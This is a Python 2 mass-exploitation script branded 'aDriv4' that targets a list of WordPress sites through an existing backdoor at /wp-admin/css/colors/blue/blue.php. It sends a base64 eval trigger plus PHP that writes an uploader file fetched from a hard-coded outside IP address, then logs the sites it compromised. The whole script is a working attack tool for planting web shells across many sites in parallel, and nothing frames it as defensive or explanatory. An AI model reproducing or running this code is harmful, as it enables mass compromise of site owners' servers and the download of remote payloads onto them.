import sys , requests, re , socket , random , string , base64
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init 

init(autoreset=True)
#aDriv4 tooL 
fr  =   Fore.RED
fg  =   Fore.GREEN

banner = '''{}
           
______       ______   _   _         _____  _     _____           
      ____       _       _  _   
  __ _|  _ \ _ __(_)_   _| || |  
 / _` | | | | '__| \ \ / / || |_ 
| (_| | |_| | |  | |\ V /|__   _|
 \__,_|____/|_|  |_| \_/    |_|  |       


TooL Free Priv aDriv4  
  

\n'''.format(fr)
print banner

requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')




headers = {'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}


def id_generator(size=8, chars=string.ascii_uppercase + string.digits):
	return ''.join(random.choice(chars) for _ in range(size))
	


def URLdomain(site):
    if 'http://' not in site and 'https://' not in site :
        site = 'http://'+site
    if site[-1]  is not '/' :
        site = site+'/'
    return site

def domain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    if 'www.' in site :
        site = site.replace("www.", "")
    site = site.rstrip()
    if site.split('/') :
        site = site.split('/')[0]
    while site[-1] == "/":
        pattern = re.compile('(.*)/')
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site

def addWWW(site):
    if site.startswith("http://"):
        site = site.replace("http://", "http://www.")
    elif site.startswith("https://"):
        site = site.replace("https://", "https://www.")
    else :
        site = 'http://www.'+site
    return site

def exploit(url) :
    try :
			dom = domain(url)
			url = URLdomain(url)
			if 'www.' in url:
				username = url.replace('www.', '')
			else:
				username = url
			if '.' in username:
				username = username.split('.')[0]
			if 'http://' in username:
				username = username.replace('http://', '')
			else:
				username = username.replace('https://', '')
			up=username.title()
			filename = id_generator()
			file_name = "uploader.php"
			shell_content = """$x=fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/wp-admin/css/colors/blue/"""+file_name+"""','w+'),file_get_contents('http://51.79.124.111/vz.txt'));echo "aDriv4".$x;"""
			data = {'vz':shell_content}
			check = requests.post(url + "/wp-admin/css/colors/blue/blue.php?wall=ZWNobyBhRHJpdjQ7ZXZhbCgkX1BPU1RbJ3Z6J10pOw==", data=data,headers=headers, verify=False, timeout=15).content
			print check
			if 'aDriv4' in check:
				print("-| {}   Success  (Found)").format(url)
				open("Uploader.txt", "a").write(url + "wp-admin/css/colors/blue/" + file_name + "\n")
				
			else:
				print("-| {}   Falid (Not ) ").format(url)
				open('badShell.txt','a').write(url+"\n")
    except :
        print ' -| ' + url + '--> {}[Failed]'.format(fr)
        


mp = Pool(150)
mp.map(exploit, target)
mp.close()
mp.join()

